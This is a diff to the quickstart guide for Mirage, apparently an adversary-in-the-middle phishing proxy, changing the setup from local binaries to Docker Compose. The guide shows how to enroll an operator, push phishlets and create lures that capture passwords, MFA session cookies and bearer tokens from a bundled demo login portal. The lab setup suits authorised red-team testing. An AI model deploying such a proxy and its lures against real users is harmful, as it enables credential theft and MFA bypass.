@@ -1,6 +1,6 @@
 # Mirage Quickstart
 
-This guide covers running both binaries on a single machine for local testing without a real domain or ACME certificates. It uses the bundled target site — a simple login portal with MFA — so you can test the full AiTM pipeline end-to-end without hitting a real site.
+This guide covers running mirage locally for testing without a real domain or ACME certificates. It uses Docker Compose to run `miraged` alongside the bundled target site — a simple login portal with MFA — so you can test the full AiTM pipeline end-to-end.
 
 ## Overview
 
@@ -9,99 +9,77 @@ Mirage is two binaries:
 - **`miraged`** — the daemon (proxy, API, DNS)
 - **`mirage`** — the operator CLI (talks to miraged over mTLS)
 
+The quickstart runs `miraged` and the target site in a shared Docker network. Docker DNS resolves the target site's hostnames (`login.target.local`, `api.target.local`) inside the network, so the proxy can reach the target directly on port 443.
+
 ---
 
-## 1. Build
+## 1. Build the CLI
+
+The operator CLI runs on the host and communicates with `miraged` over mTLS.
 
 ```bash
 make build
 # produces build/miraged and build/mirage
 ```
 
+> Only `build/mirage` (the CLI) is needed on the host — Docker Compose builds the `miraged` image separately.
+
 ---
 
-## 2. Start the target site
-
-The `examples/target-site/` directory contains a small Flask login portal ("Vault") with email/password and MFA steps — enough to test credential capture and session token capture end-to-end.
+## 2. Start the services
 
 ```bash
-docker compose -f examples/target-site/docker-compose.yml up -d
+docker compose -f examples/quickstart/docker-compose.yml up -d
 ```
+
+This starts two containers in a shared network:
+
+| Service | Internal port | Host port | Purpose |
+|---------|--------------|-----------|---------|
+| `miraged` | 443 | 443 | Phishing proxy + management API |
+| `target-site` | 443 | 8443 | Upstream login portal |
+
+The target site is reachable from the host at `https://login.target.local:8443` and from `miraged` at `https://login.target.local:443` (via Docker DNS).
 
 ---
 
-## 3. Create directories and config
+## 3. Add /etc/hosts entries
+
+Point the phishing and target site hostnames at localhost:
 
 ```bash
-mkdir -p /tmp/mirage/data
+echo "127.0.0.1  login.phish.local  api.phish.local  mgmt.phish.local" | sudo tee -a /etc/hosts
+echo "127.0.0.1  login.target.local  api.target.local" | sudo tee -a /etc/hosts
 ```
 
-Create `/tmp/mirage/miraged.yaml`:
-
-```yaml
-domain: phish.local
-external_ipv4: 127.0.0.1
-bind_address: 127.0.0.1
-data_dir: /tmp/mirage/data
-
-self_signed: true
-
-api:
-  secret_hostname: mgmt.phish.local
-```
-
-> Required fields: `domain`, `external_ipv4`, and `api.secret_hostname`. Set `self_signed: true` to skip ACME and use a locally generated CA instead. `bind_address` restricts the listener to `127.0.0.1` so it doesn't conflict with the target site on `127.0.0.2`. In production, omit it to listen on all interfaces.
+> The phishing entries let your browser reach the proxy. The target site entries are optional — they let you browse the target site directly at `https://login.target.local:8443` to try the normal login flow. Inside the Docker network, `miraged` resolves these hostnames via Docker DNS.
 
 ---
 
-## 4. Add /etc/hosts entries
+## 4. Trust the self-signed CA in your browser
 
-Since there's no real DNS, point all hostnames at localhost:
+Copy the CA certificate from the container's data volume:
 
 ```bash
-echo "127.0.0.1  login.phish.local  api.phish.local" | sudo tee -a /etc/hosts
-echo "127.0.0.2  login.target.local  api.target.local" | sudo tee -a /etc/hosts
+docker compose -f examples/quickstart/docker-compose.yml cp miraged:/var/lib/mirage/ca/mirage-ca.crt /tmp/mirage-ca.crt
 ```
 
-> The target site binds to `127.0.0.2:443` and the proxy to `127.0.0.1:443`, avoiding port conflicts while keeping both on standard ports.
-
----
-
-## 5. Start miraged
-
-Allow the binary to bind privileged ports (443, 53) without root, then start it:
-
-```bash
-sudo setcap cap_net_bind_service=+ep ./build/miraged
-./build/miraged --config /tmp/mirage/miraged.yaml --debug
-```
-
-On first run it will:
-
-- Create a TLS CA at `/tmp/mirage/data/ca/mirage-ca.crt`
-- Create an mTLS API CA at `/tmp/mirage/data/api-ca.crt`
-- Generate an invite token for the first operator
-
-Look for the enrollment command in the output:
-
-```
-level=INFO msg="enroll with: mirage server add --address 127.0.0.1:443 --secret-hostname mgmt.phish.local --token <token>"
-```
-
----
-
-## 6. Trust the self-signed CA in your browser
-
-Import `/tmp/mirage/data/ca/mirage-ca.crt` as a trusted CA so the browser doesn't block requests to the phishing hostname.
+Import `/tmp/mirage-ca.crt` as a trusted CA so the browser doesn't block requests to the phishing hostname.
 
 - **Firefox:** Settings → Privacy & Security → View Certificates → Authorities → Import
 - **Chrome:** Settings → Privacy and security → Security → Manage certificates → Authorities → Import
 
 ---
 
-## 7. Enroll the operator
+## 5. Enroll the operator
 
-In a second terminal, copy and run the enrollment command from the daemon output, adding `--alias local`:
+Check the daemon logs for the enrollment command:
+
+```bash
+docker compose -f examples/quickstart/docker-compose.yml logs miraged | grep "enroll with"
+```
+
+Copy and run it, adding `--alias local`:
 
 ```bash
 ./build/mirage server add --alias local --address 127.0.0.1:443 --secret-hostname mgmt.phish.local --token <token>
@@ -111,7 +89,7 @@ On success you'll see `Enrolled successfully. Server saved as "local".`
 
 ---
 
-## 8. Push the phishlet, enable it, and create a lure
+## 6. Push the phishlet, enable it, and create a lure
 
 ```bash
 # Push the phishlet definition
@@ -121,7 +99,7 @@ On success you'll see `Enrolled successfully. Server saved as "local".`
 ./build/mirage phishlets enable form-login --hostname login.phish.local
 
 # Create a lure (redirect URL is where victims land after token capture)
-./build/mirage lures create form-login --redirect https://login.target.local/demo-complete
+./build/mirage lures create form-login --redirect https://login.target.local:8443/demo-complete
 ```
 
 Visit the printed lure URL in a browser that trusts the CA. You'll be taken to the standard login form. Sign in with any email and password, then enter any 6-digit code for MFA. Once MFA completes the session token is captured and the session is marked complete:
@@ -136,16 +114,6 @@ Visit the printed lure URL in a browser that trusts the CA. You'll be taken to t
 ## File layout after first run
 
 ```txt
-/tmp/mirage/                        # server
-├── miraged.yaml
-└── data/
-    ├── data.db                     # SQLite — sessions, lures, phishlets, operators
-    ├── ca/
-    │   ├── mirage-ca.crt           # TLS CA — import into browser
-    │   └── mirage-ca.key
-    ├── api-ca.crt                  # mTLS operator CA
-    └── api-ca.key
-
 ~/.mirage/                          # operator workstation
 ├── client.json                     # server config
 ├── local.crt                       # operator cert (enrolled)
@@ -153,13 +121,16 @@ Visit the printed lure URL in a browser that trusts the CA. You'll be taken to t
 └── local-ca.crt                    # server's API CA cert
 ```
 
+Server state (CA certs, database) is stored in the `mirage-data` Docker volume.
+
 ---
 
 ## Tips
 
-- Run `./build/miraged --config /tmp/mirage/miraged.yaml validate` to check your config without starting the daemon.
+- Run `docker compose -f examples/quickstart/docker-compose.yml logs -f miraged` to tail daemon logs.
 - `./build/mirage` with no subcommand drops into an interactive REPL.
 - The CLI `--json` flag outputs raw JSON for scripting.
+- To start fresh, remove the volume: `docker compose -f examples/quickstart/docker-compose.yml down -v`
 
 ---
 
@@ -172,15 +143,15 @@ The target site includes two additional login flows you can test with different 
 - **API login phishlet** — Captures bearer tokens from JSON responses instead of cookies.
 
   ```bash
-  mirage phishlets push examples/phishlets/api-login.yaml
-  mirage phishlets enable api-login --hostname login.phish.local
-  mirage lures create api-login --redirect https://login.target.local/demo-complete
+  ./build/mirage phishlets push examples/phishlets/api-login.yaml
+  ./build/mirage phishlets enable api-login --hostname login.phish.local
+  ./build/mirage lures create api-login --redirect https://login.target.local:8443/demo-complete
   ```
 
 - **Multi-host phishlet** — Proxies two subdomains (`login` and `api`), demonstrating cross-origin auth and multi-host routing.
 
   ```bash
-  mirage phishlets push examples/phishlets/multi-host.yaml
-  mirage phishlets enable multi-host --hostname login.phish.local
-  mirage lures create multi-host --redirect https://login.target.local/demo-complete
+  ./build/mirage phishlets push examples/phishlets/multi-host.yaml
+  ./build/mirage phishlets enable multi-host --hostname login.phish.local
+  ./build/mirage lures create multi-host --redirect https://login.target.local:8443/demo-complete
   ```
